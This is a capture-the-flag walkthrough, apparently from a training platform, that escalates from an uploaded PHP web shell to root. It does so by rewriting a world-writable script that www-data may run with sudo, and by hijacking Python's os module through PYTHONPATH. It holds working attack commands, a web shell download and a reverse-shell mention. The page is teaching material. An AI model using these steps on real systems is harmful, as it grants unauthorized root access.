## Hints
Because our challenges do not all have the same amount of hints, our deduction system is based on the % of hints used. If a challenge has 4 hints, each hint is worth 25%. If you use the complete solution, you get 0 points.

1. Where to start (-20%)

Collapse
Prerequisite - Part 1. and Part 2. of the challenge should be solved first.
We need to get some kind of shell access to server, execute command.

2. First idea (-20%)

Collapse
Whenever we have access to the server as some restricted user, usually it is www-data or whatever user running the webserver process, we can try to do privilege escalation.
There are lots of scripts for finding vulnerabilities that can allow us to do privilege escalation like 'linpeas', but the first thing we should try is to check if our user have any `sudo` rights. If there is we could try exploiting that.
The goal of this challenge is to use server misconfiguration to gain access as root user (privilege escalation).

3. Complete solution (-20%)

Collapse
Since we can upload php files it is good idea to upload php file where we can type commands and see output directly.
Some kind of web shell access.
We can use (script)[https://github.com/Arrexel/phpbash] for this purpose.

Note, when it can be done we could also upload php reverse shell script that way using netcat we can get reverse shell access.
For this challange we will use php web shell.
Download PHP web shell script:

```wget https://raw.githubusercontent.com/Arrexel/phpbash/master/phpbash.php```
And upload to the server and access our php shell by clicking on picture icon or directly:

```http://SERVENAME:8888/img/phpbash.php```
Then we can try reading root.txt file by typing:

```cat /root/root.txt```
We will get access error:
```sh
www-data@avatao
:/var/www/html/img# cat /root/root.txt

cat: /root/root.txt: Permission denied
```
The first that is check for misconfiguration is sudo with `sudo -l` command.
```sh
www-data@avatao
:/var/www/html/img# sudo -l

Matching Defaults entries for www-data on avatao:
 env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on avatao:
 (ALL : ALL) SETENV: NOPASSWD: /opt/scripts/mycleaner
```
We can see that `www-data` user can access and run as root `/opt/scripts/mycleaner`.
We can now read file:
```py
#!/usr/bin/env python3

import os
try:
 os.remove("/tmp/dziapp-cache/*") 
except:
 pass

print ("cache cleaned ...")
```
and if we do `ls -la` on thath script we get:
```sh
www-data@avatao
:/var/www/html/img# ls -la /opt/scripts/mycleaner
-rwxrwxrwx 1 www-data www-data 127 Mar 9 07:38 /opt/scripts/mycleaner
```
Based on this we can see two ways of exploiting. First we see tath sys admin was lazy and set `chmod 777` on that script that means we can change it and put what ever we wont to run as sudo.

4. First approach (-20%)

```sh
www-data@avatao
:/var/www/html/img# echo "#!/bin/bash\ncat /root/root.txt" > /opt/scripts/mycleaner


www-data@avatao
:/var/www/html/img# sudo /opt/scripts/mycleaner

#Flag will be displayed here
```
5. Second approach (-100%)

The other way in case that sys admin wasn't lazy and put chmod 777, and we can not change that file we can use PYTHONPATH environment variable to read flag file.

First we create `os.py` file:

```echo "#!/usr/bib/env python3\nfileObject = open('/root/root.txt', 'r')\ndata = fileObject.read()\nprint(data)" > os.py```
Run the following command:

```sudo PYTHONPATH=/var/www/html/img /opt/scripts/mycleaner```
At the end flag will be displayed. This can be done only before changing mycleaner script to bash type script that we done in the first attempt.

# Lessons learned:

    -   System administrators should be careful when adding www-data user to sudoers.
    -   Never ever use 777 file access permission (world writable).
    -   This kind of vulnerability is not software related, it is in the category of 'Security Misconfiguration' which on the OWASP Top 10 risks.
    -   Read more on [OWASP's related site](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)